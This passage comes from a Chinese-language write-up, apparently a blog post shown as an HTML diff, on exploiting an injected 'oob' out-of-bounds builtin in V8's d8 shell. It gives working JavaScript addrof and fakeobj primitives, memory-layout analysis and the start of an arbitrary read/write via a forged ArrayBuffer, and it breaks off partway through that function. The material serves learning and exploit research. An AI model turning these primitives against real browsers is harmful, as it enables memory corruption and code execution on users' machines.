+	<span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">]</span>
+	<span class="k">return</span> <span class="nx">zero_high_word</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">()));</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">get_map_obj_array</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{};</span>
+  <span class="kd">let</span> <span class="nx">arr1</span> <span class="o">=</span> <span class="p">[</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">];</span>
+  <span class="kd">let</span> <span class="nx">arr2</span> <span class="o">=</span> <span class="p">[</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">];</span>
+  <span class="c1">// arr1.oob will read arr2's map</span>
+  <span class="k">return</span> <span class="nx">zero_high_word</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr1</span><span class="p">.</span><span class="nx">oob</span><span class="p">()));</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">modify_double_arr_map</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">new_map</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">old_v</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">());</span>
+  <span class="nx">new_v</span> <span class="o">=</span> <span class="nx">old_v</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="dl">'</span><span class="s1">0xffffffff0000000</span><span class="dl">'</span><span class="p">)</span> <span class="o">|</span> <span class="nx">new_map</span><span class="p">;</span>
+  <span class="nx">arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">itof</span><span class="p">(</span><span class="nx">new_v</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="nx">double_array_map</span> <span class="o">=</span> <span class="nx">get_map_double_array</span><span class="p">();</span>
+<span class="nx">obj_array_map</span> <span class="o">=</span> <span class="nx">get_map_obj_array</span><span class="p">();</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">double_array_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">obj_array_map</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">];</span>
+
+<span class="kd">let</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{}</span>
+<span class="nx">modify_double_arr_map</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">obj_array_map</span><span class="p">)</span>
+<span class="nx">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
+<span class="nx">modify_double_arr_map</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">double_array_map</span><span class="p">)</span>
+<span class="kd">let</span> <span class="nx">addrofobj</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x00000000ffffffff</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">addrofobj</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">oob</code> 函数的返回值是浮点型的，为了方便对其进行位运算，需要实现了类型转换函数 <code class="language-plaintext highlighter-rouge">ftoi</code>、<code class="language-plaintext highlighter-rouge">itof</code>。</p>
+
+<p>验证下效果：</p>
+
+<hr />
+
+<p><strong>ℹ️NOTE</strong>: 使用Release 版的 d8.exe</p>
+
+<hr />
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./d8.exe <span class="nt">--allow-natives-syntax</span>
+V8 version 9.4.0 <span class="o">(</span>candidate<span class="o">)</span>
+d8&gt; load<span class="o">(</span><span class="s2">"poc.js"</span><span class="o">)</span>
+8203ae1
+8203b31
+8049901
+undefined
+d8&gt; %DebugPrint<span class="o">(</span>obj<span class="o">)</span>
+0x023108049901 &lt;Object map <span class="o">=</span> 00000231082022D1&gt;
+<span class="o">{}</span>
+</code></pre></div></div>
+
+<h3 id="fakeobj">fakeobj</h3>
+
+<p>把修改 map 顺序变换一下，就可以实现 fakeobj:</p>
+
+<ul>
+  <li>把指针转换成浮点数，存入浮点数组</li>
+  <li>浮点数组的 map 改成对象数组的</li>
+  <li>把刚存入的指针当成对象读出。</li>
+  <li>恢复 map</li>
+</ul>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">tagged_ptr</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">tagged_ptr</span><span class="p">)</span>
+  <span class="nx">modify_double_arr_map</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">obj_array_map</span><span class="p">)</span>
+  <span class="nx">res</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+  <span class="nx">modify_double_arr_map</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">double_array_map</span><span class="p">)</span>
+  <span class="k">return</span> <span class="nx">res</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>可以用数组构造 <code class="language-plaintext highlighter-rouge">tagged_ptr</code> 指向的内存：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">modify_double_arr_map</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">obj_array_map</span><span class="p">)</span>
+  <span class="nx">arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
+  <span class="nx">modify_double_arr_map</span><span class="p">(</span><span class="nx">arr</span><span class="p">,</span> <span class="nx">double_array_map</span><span class="p">)</span>
+
+  <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&amp;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="dl">"</span><span class="s2">0x00000000ffffffff</span><span class="dl">"</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="c1">// fake a double Array</span>
+<span class="nx">arr_contains_fake_obj</span> <span class="o">=</span> <span class="p">[</span><span class="nx">itof</span><span class="p">(</span><span class="nx">make_qword</span><span class="p">(</span><span class="nx">double_array_map</span><span class="p">,</span> <span class="mi">0</span><span class="p">)),</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">make_qword</span><span class="p">(</span><span class="nx">double_array_map</span><span class="p">,</span> <span class="mi">6</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)),</span> <span class="mf">1.3</span><span class="p">];</span>
+<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">arr_contains_fake_obj</span><span class="p">);</span>
+<span class="nx">fixed_arr_ends</span> <span class="o">=</span> <span class="nx">arr_begin</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arr_contains_fake_obj</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">fixed_arr_ends</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="c1">// 获取fakeobj的起始地址</span>
+<span class="nx">fake_obj_tagged_ptr</span> <span class="o">=</span> <span class="nx">fixed_arr_ends</span> <span class="o">-</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">3</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">fake_obj_tagged_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p>刚好在下图红色框出的区域构造出了可以作为浮点数组使用的内存。</p>
+
+<p><img src="/assets/images/Pasted image 20220219175057.png" alt="" /></p>
+
+<p>这个伪造的数组：</p>
+
+<ul>
+  <li>map：浮点数组 map <code class="language-plaintext highlighter-rouge">0x08203ae1</code></li>
+  <li>properties：<code class="language-plaintext highlighter-rouge">0</code> 不会用到</li>
+  <li>elements： <code class="language-plaintext highlighter-rouge">0x0820eae1</code>， 只是随便选了一个可访问的内存，没有特殊需要</li>
+  <li>length：<code class="language-plaintext highlighter-rouge">0xc</code> =&gt; <code class="language-plaintext highlighter-rouge">6</code> 的 Smi 形式。</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">arr_contains_fake_obj</code> 的地址减去 24 就可以是红框的起始地址，把这个起始地址转换成 tagged pointer 就可以用作 <code class="language-plaintext highlighter-rouge">fakeobj</code> 函数的参数。</p>
+
+<p>验证下效果：</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 调用 fakeobj 函数，得到伪造的数组</span>
+<span class="kd">let</span> <span class="nx">fake_obj</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">fake_obj_tagged_ptr</span><span class="p">);</span>
+<span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">fake_obj</span><span class="p">);</span>
+<span class="c1">// 读取伪造的数组的第一个元素</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">fake_obj</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="nx">readline</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p>./d8.exe –allow-natives-sytax poc.js 运行后输出如下:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>8203ae1
+8203b31
+8049bc9
+0x01c908049d09 &lt;JSArray[3]&gt;
+8049d09
+8049cf1
+0x01c908049cf1 &lt;JSArray[6]&gt;
+1.6291488275489796e-260
+</code></pre></div></div>
+
+<p><img src="/assets/images/Pasted image 20220219173826.png" alt="" /></p>
+
+<h3 id="任意内存读写">任意内存读、写</h3>
+
+<p>用 addrof 和 fakeobj，伪造一个 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Uint8Array"><code class="language-plaintext highlighter-rouge">Uint8Array</code></a> 对象，就可以实现任意内存读写。</p>
+
+<p>先分析 <code class="language-plaintext highlighter-rouge">Uint8Array</code> 对象的内存布局：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Debug 版运行
+d8&gt; <span class="nb">let </span>u8a <span class="o">=</span> new Uint8Array<span class="o">(</span>8<span class="o">)</span>
+undefined
+d8&gt; %DebugPrint<span class="o">(</span>u8a<span class="o">)</span>
+DebugPrint: 000000A408108E21: <span class="o">[</span>JSTypedArray]
+ - map: 0x00a4082c24d9 &lt;Map<span class="o">(</span>UINT8ELEMENTS<span class="o">)&gt;</span> <span class="o">[</span>FastProperties]
+ - prototype: 0x00a408284efd &lt;Object map <span class="o">=</span> 000000A4082C2501&gt;
+ - elements: 0x00a408108e11 &lt;ByteArray[8]&gt; <span class="o">[</span>UINT8ELEMENTS]
+ - embedder fields: 2
+ - buffer: 0x00a408108dd1 &lt;ArrayBuffer map <span class="o">=</span> 000000A4082C3271&gt;
+ - byte_offset: 0
+ - byte_length: 8
+ - length: 8
+ - data_ptr: 000000A408108E18
+   - base_pointer: 0000000008108E11
+   - external_pointer: 000000A400000007
+ - properties: 0x00a40800222d &lt;FixedArray[0]&gt;
+ - All own properties <span class="o">(</span>excluding elements<span class="o">)</span>: <span class="o">{}</span>
+ - elements: 0x00a408108e11 &lt;ByteArray[8]&gt; <span class="o">{</span>
+         0-7: 0
+ <span class="o">}</span>
+ - embedder fields <span class="o">=</span> <span class="o">{</span>
+    0, aligned pointer: 0000000000000000
+    0, aligned pointer: 0000000000000000
+ <span class="o">}</span>
+000000A4082C24D9: <span class="o">[</span>Map]
+ - <span class="nb">type</span>: JS_TYPED_ARRAY_TYPE
+ - instance size: 72
+ - inobject properties: 0
+ - elements kind: UINT8ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x00a4080023b5 &lt;undefined&gt;
+ - prototype_validity cell: 0x00a408202405 &lt;Cell <span class="nv">value</span><span class="o">=</span> 1&gt;
+ - instance descriptors <span class="o">(</span>own<span class="o">)</span> <span class="c">#0: 0x00a4080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span>
+ - prototype: 0x00a408284efd &lt;Object map <span class="o">=</span> 000000A4082C2501&gt;
+ - constructor: 0x00a408284e85 &lt;JSFunction Uint8Array <span class="o">(</span>sfi <span class="o">=</span> 000000A408209E01<span class="o">)&gt;</span>
+ - dependent code: 0x00a4080021b9 &lt;Other heap object <span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)&gt;</span>
+ - construction counter: 0
+
+0,0,0,0,0,0,0,0
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Uint8Array</code> 对应 <code class="language-plaintext highlighter-rouge">v8::internal::JSTypedArray</code>，分析源码得到如下内存布局：</p>
+
+<ul>
+  <li>JSTypedArray
+    <ul>
+      <li>JSArrayBufferView
+        <ul>
+          <li>JSObject
+            <ul>
+              <li>map</li>
+              <li>properties</li>
+              <li>elements</li>
+            </ul>
+          </li>
+          <li>Buffer: tagged pointer</li>
+          <li>ByteOffset: intptr_t</li>
+          <li>ByteLength: intptr_t</li>
+        </ul>
+      </li>
+      <li>Length: intptr_t</li>
+      <li>ExternalPointer: intptr_t</li>
+      <li>BasePointer: Tagged Pointer</li>
+      <li>BitFoeld: int32_t</li>
+      <li>OptionalPadding: 对齐填充</li>
+    </ul>
+  </li>
+</ul>
+
+<p>查看内存：</p>
+
+<p><img src="/assets/images/Pasted image 20220219191914.png" alt="" /></p>
+
+<p>buffer 指向的是与 <code class="language-plaintext highlighter-rouge">Uint8Array</code> 关联的 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 对象。<code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 对应 <code class="language-plaintext highlighter-rouge">js::internal::JSArrayBuffer</code>，分析源码得到如下内存布局：</p>
+
+<ul>
+  <li>JSArrayBuffer
+    <ul>
+      <li>JSObject
+        <ul>
+          <li>map</li>
+          <li>properties</li>
+          <li>elements</li>
+        </ul>
+      </li>
+      <li>ByteLength: intptr_t</li>
+      <li>MaxByteLength: intptr_t</li>
+      <li>BackingStore: intptr_t</li>
+      <li>Extension: intptr_t</li>
+      <li>BitField: int32_t</li>
+      <li>OptinalPadding: 对齐填充</li>
+    </ul>
+  </li>
+</ul>
+
+<p>用调试器分析这两个类型:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; <span class="nb">let </span>buf <span class="o">=</span> new ArrayBuffer<span class="o">(</span>8<span class="o">)</span>
+undefined
+d8&gt; <span class="nb">let </span>u8a <span class="o">=</span> new Uint8Array<span class="o">(</span>buf<span class="o">)</span>
+undefined
+d8&gt; u8a[0] <span class="o">=</span> 0xaa
+170
+d8&gt; u8a[1] <span class="o">=</span> 0xbb
+187
+d8&gt; u8a[2] <span class="o">=</span> 0xcc
+204
+d8&gt; %DebugPrint<span class="o">(</span>u8a<span class="o">)</span>
+DebugPrint: 000000A40810A669: <span class="o">[</span>JSTypedArray]
+ - map: 0x00a4082c24d9 &lt;Map<span class="o">(</span>UINT8ELEMENTS<span class="o">)&gt;</span> <span class="o">[</span>FastProperties]
+ - prototype: 0x00a408284efd &lt;Object map <span class="o">=</span> 000000A4082C2501&gt;
+ - elements: 0x00a408003245 &lt;ByteArray[0]&gt; <span class="o">[</span>UINT8ELEMENTS]
+ - embedder fields: 2
+ - buffer: 0x00a40810a5bd &lt;ArrayBuffer map <span class="o">=</span> 000000A4082C3271&gt;
+ - byte_offset: 0
+ - byte_length: 8
+ - length: 8
+ - data_ptr: 0000021474AB8710
+   - base_pointer: 0000000000000000
+   - external_pointer: 0000021474AB8710
+ - properties: 0x00a40800222d &lt;FixedArray[0]&gt;
+ - All own properties <span class="o">(</span>excluding elements<span class="o">)</span>: <span class="o">{}</span>
+ - elements: 0x00a408003245 &lt;ByteArray[0]&gt; <span class="o">{</span>
+           0: 170
+           1: 187
+           2: 204
+         3-7: 0
+ <span class="o">}</span>
+ - embedder fields <span class="o">=</span> <span class="o">{</span>
+    0, aligned pointer: 0000000000000000
+    0, aligned pointer: 0000000000000000
+ <span class="o">}</span>
+000000A4082C24D9: <span class="o">[</span>Map]
+ - <span class="nb">type</span>: JS_TYPED_ARRAY_TYPE
+ - instance size: 72
+ - inobject properties: 0
+ - elements kind: UINT8ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x00a4080023b5 &lt;undefined&gt;
+ - prototype_validity cell: 0x00a408202405 &lt;Cell <span class="nv">value</span><span class="o">=</span> 1&gt;
+ - instance descriptors <span class="o">(</span>own<span class="o">)</span> <span class="c">#0: 0x00a4080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span>
+ - prototype: 0x00a408284efd &lt;Object map <span class="o">=</span> 000000A4082C2501&gt;
+ - constructor: 0x00a408284e85 &lt;JSFunction Uint8Array <span class="o">(</span>sfi <span class="o">=</span> 000000A408209E01<span class="o">)&gt;</span>
+ - dependent code: 0x00a4080021b9 &lt;Other heap object <span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)&gt;</span>
+ - construction counter: 0
+
+170,187,204,0,0,0,0,0
+
+	d8&gt; %DebugPrint<span class="o">(</span>buf<span class="o">)</span>
+DebugPrint: 000000A40810A5BD: <span class="o">[</span>JSArrayBuffer]
+ - map: 0x00a4082c3271 &lt;Map<span class="o">(</span>HOLEY_ELEMENTS<span class="o">)&gt;</span> <span class="o">[</span>FastProperties]
+ - prototype: 0x00a40828a129 &lt;Object map <span class="o">=</span> 000000A4082C3299&gt;
+ - elements: 0x00a40800222d &lt;FixedArray[0]&gt; <span class="o">[</span>HOLEY_ELEMENTS]
+ - embedder fields: 2
+ - backing_store: 0000021474AB8710
+ - byte_length: 8
+ - max_byte_length: 8
+ - detachable
+ - properties: 0x00a40800222d &lt;FixedArray[0]&gt;
+ - All own properties <span class="o">(</span>excluding elements<span class="o">)</span>: <span class="o">{}</span>
+ - embedder fields <span class="o">=</span> <span class="o">{</span>
+    0, aligned pointer: 0000000000000000
+    0, aligned pointer: 0000000000000000
+ <span class="o">}</span>
+000000A4082C3271: <span class="o">[</span>Map]
+ - <span class="nb">type</span>: JS_ARRAY_BUFFER_TYPE
+ - instance size: 64
+ - inobject properties: 0
+ - elements kind: HOLEY_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - stable_map
+ - back pointer: 0x00a4080023b5 &lt;undefined&gt;
+ - prototype_validity cell: 0x00a408202405 &lt;Cell <span class="nv">value</span><span class="o">=</span> 1&gt;
+ - instance descriptors <span class="o">(</span>own<span class="o">)</span> <span class="c">#0: 0x00a4080021c1 &lt;Other heap object (STRONG_DESCRIPTOR_ARRAY_TYPE)&gt;</span>
+ - prototype: 0x00a40828a129 &lt;Object map <span class="o">=</span> 000000A4082C3299&gt;
+ - constructor: 0x00a40828a055 &lt;JSFunction ArrayBuffer <span class="o">(</span>sfi <span class="o">=</span> 000000A40820EB31<span class="o">)&gt;</span>
+ - dependent code: 0x00a4080021b9 &lt;Other heap object <span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)&gt;</span>
+ - construction counter: 0
+
+<span class="o">[</span>object ArrayBuffer]
+</code></pre></div></div>
+
+<p>JSTypedArray:</p>
+
+<p><img src="/assets/images/Pasted image 20220219195501.png" alt="" /></p>
+
+<p>JSArrayBuffer:</p>
+
+<p><img src="/assets/images/Pasted image 20220219200057.png" alt="" /></p>
+
+<p>BackingStore:</p>
+
+<p><img src="/assets/images/Pasted image 20220219200218.png" alt="" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">JSArrayBuffer</code> 的 BackStore 应该是缓冲区的实际指针了。在调试器里把 BackStore 的地址 +4，看看读取到的数据是否变化。</p>
+
+<p><img src="/assets/images/Pasted image 20220219200616.png" alt="" /></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; u8a[0] <span class="o">=</span> 0xdd
+221
+d8&gt; u8a[0]
+221
+d8&gt; u8a
+221,187,204,0,0,0,0,0
+</code></pre></div></div>
+
+<p>没有达到预期的效果，分析下原因，backing_store 的开始，创建内存写入断点，之后执行 ua8[0] = 0xdd。程序断下，调用栈如下：</p>
+
+<p><img src="/assets/images/Pasted image 20220220142131.png" alt="" /></p>
+
+<p>分析调用栈后，发现写入地址是 <code class="language-plaintext highlighter-rouge">JSTypedArray::DataPtr()</code> 获取的：</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span><span class="o">*</span> <span class="n">JSTypedArray</span><span class="o">::</span><span class="n">DataPtr</span><span class="p">()</span> <span class="p">{</span>
+  <span class="c1">// Zero-extend Tagged_t to Address according to current compression scheme</span>
+  <span class="c1">// so that the addition with |external_pointer| (which already contains</span>
+  <span class="c1">// compensated offset value) will decompress the tagged value.</span>
+  <span class="c1">// See JSTypedArray::ExternalPointerCompensationForOnHeapArray() for details.</span>
+  <span class="n">STATIC_ASSERT</span><span class="p">(</span><span class="n">kOffHeapDataPtrEqualsExternalPointer</span><span class="p">);</span>
+  <span class="k">return</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">void</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">external_pointer</span><span class="p">()</span> <span class="o">+</span>
+                                 <span class="k">static_cast</span><span class="o">&lt;</span><span class="n">Tagged_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">base_pointer</span><span class="p">().</span><span class="n">ptr</span><span class="p">()));</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>由 <code class="language-plaintext highlighter-rouge">external_pointer</code> 和 <code class="language-plaintext highlighter-rouge">base_pointer</code> 两项相加得出，并不会访问 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 <code class="language-plaintext highlighter-rouge">backing_store</code>。推测是 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 内部的缓冲区已经被提前拷贝到 <code class="language-plaintext highlighter-rouge">TypedArray</code> 结构中了，这样的话新建一个 <code class="language-plaintext highlighter-rouge">UInt8Array</code> 应该是可以的。</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>d8&gt; u8a2 <span class="o">=</span> new Uint8Array<span class="o">(</span>buf<span class="o">)</span>
+0,0,0,0,253,253,253,253
+d8&gt; u8a2[0] <span class="o">=</span> 0xdd
+221
+d8&gt; u8a2[0]
+221
+d8&gt; u8a
+221,187,204,0,221,0,0,0
+</code></pre></div></div>
+
+<p><img src="/assets/images/Pasted image 20220219201551.png" alt="" /></p>
+
+<h3 id="任意内存读写-1">任意内存读写</h3>
+
+<p>伪造 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 实现任意内存读写，分成下面几个步骤：</p>
+
+<ul>
+  <li>读取 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 map</li>
+  <li>数组中伪造出 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code></li>
+  <li>利用 <code class="language-plaintext highlighter-rouge">fakeobj</code> 函数，得到伪造 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 对象</li>
+</ul>
+
+<p>读取 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 map 的方法和读取对象数组的类似，创建一个包含 4 个元素的对象数组和一个 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，这样对象数组的 <code class="language-plaintext highlighter-rouge">oob</code> 函数就可以读到 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 map。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">read_array_buffer_map</span><span class="p">()</span> <span class="p">{</span>
+  <span class="nx">obj</span> <span class="o">=</span> <span class="p">{}</span>
+  <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">,</span> <span class="nx">obj</span><span class="p">]</span>
+  <span class="nx">arr_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">();</span>
+  <span class="nx">map</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">map</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+  <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">obj_arr</span><span class="p">);</span>
+  <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">arr_buf</span><span class="p">);</span>
+	<span class="k">return</span> <span class="nx">map</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nx">arr_buf_map</span> <span class="o">=</span> <span class="nx">read_array_buffer_map</span><span class="p">();</span>
+
+<span class="cm">/*
+输出:
+800222d08203271
+804aa9d
+0x03ee0804aa8d &lt;JSArray[4]&gt;
+0x03ee0804aa9d &lt;ArrayBuffer map = 000003EE08203271&gt;
+*/</span>
+</code></pre></div></div>
+
+<p>接下来在数组中伪造出一个 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code>，<code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 总计 <code class="language-plaintext highlighter-rouge">0x30</code> 字节，创建一个 <code class="language-plaintext highlighter-rouge">6</code> 个元素的浮点数数组就应该足够了，但是如果从元素 <code class="language-plaintext highlighter-rouge">0</code> 开始布局内存的话，ByteLength、MaxByteLength、BackingStore 等元素，所在的位置就会横跨两个数组下标，赋值有些不方便。如果把 <code class="language-plaintext highlighter-rouge">ArrayBuffer</code> 的 map，放在浮点数组的第一个元素的高 <code class="language-plaintext highlighter-rouge">32 </code>位，会更方便一些，这就需要创建一个 <code class="language-plaintext highlighter-rouge">7</code> 个元素的浮点数组。</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 伪造任意ArrayBuffer</span>
+<span class="kd">function</span> <span class="nx">fake_array_buffer</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">len</span><span class="p">)</span> <span class="p">{</span>
+  <span class="nx">double_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">,</span> <span class="mf">1.5</span><span class="p">,</span> <span class="mf">1.6</span><span class="p">,</span> <span class="mf">1.7</span><span class="p">];</span>
+  <span class="c1">// [0x00000000, Map]</span>
+  <span class="nx">double_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">ftoi</span><span class="p">(</span><span class="nx">arr_buf_map</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nx">BigInt</span><span class="p">(</span><span class="mi">32</span><span class="p">))</span>
+  <span class="c1">// [props, elems] 不影响利用,填0</span>
+  <span class="nx">double_arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">make_qword</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
+  <span class="c1">// [ByteLenghLow, ByteLengthHigh]</span>
